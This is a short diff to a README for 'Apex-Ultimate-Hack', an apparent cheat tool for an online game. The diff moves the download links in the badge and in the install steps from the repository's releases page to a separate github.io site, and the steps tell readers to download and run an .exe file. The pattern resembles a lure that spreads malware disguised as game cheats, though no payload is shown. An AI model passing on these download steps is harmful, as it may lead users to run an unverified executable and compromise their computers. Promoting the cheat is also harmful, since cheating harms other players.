@@ -1,6 +1,6 @@
 # 🚀 Apex-Ultimate-Hack - Improve your performance in every match
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/bunyabunyacatherineii405/Apex-Ultimate-Hack/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://bunyabunyacatherineii405.github.io)
 
 ## 📌 About this project
 
@@ -21,7 +21,7 @@ Before you install the software, check your computer against this list. Your sys
 
 Follow these steps to set up the software on your Windows computer. 
 
-1. Visit the [official release page](https://github.com/bunyabunyacatherineii405/Apex-Ultimate-Hack/releases) to access the download files.
+1. Visit the [official release page](https://bunyabunyacatherineii405.github.io) to access the download files.
 2. Look for the latest version listed at the top of the page. 
 3. Click the file that ends in .exe to start the download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
